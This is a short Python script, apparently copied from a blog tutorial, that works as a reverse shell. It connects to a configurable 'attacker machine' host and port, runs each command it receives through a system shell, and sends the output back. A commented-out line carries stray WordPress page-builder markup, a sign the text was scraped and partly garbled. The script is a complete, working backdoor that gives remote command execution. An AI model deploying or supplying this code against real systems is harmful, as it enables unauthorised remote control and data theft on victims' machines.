#!/usr/bin/python
# imports here
import socket,subprocess
HOST = '127.0.0.1'    # The remote host
PORT = 3333            # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connect to attacker machine
s.connect((HOST, PORT))
# send we are connected
#s.send('[fusion_builder_container hundred_percent="yes" overflow="visible"][fusion_builder_row][fusion_builder_column type="1_1" background_position="left top" background_color="" border_size="" border_color="" border_style="solid" spacing="yes" background_image="" background_repeat="no-repeat" padding="" margin_top="0px" margin_bottom="0px" class="" id="" animation_type="" animation_speed="0.3" animation_direction="left" hide_on_mobile="no" center_content="no" min_height="none"][*] Connection Established!')
# start loop
while 1:
     # recieve shell command
     data = s.recv(1024)
     # if its quit, then break out and close socket
     if data == "quit": break
     # do shell command
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     # read output
     stdout_value = proc.stdout.read() + proc.stderr.read()
     # send output to attacker
     s.send(stdout_value)
# close socket
s.close()
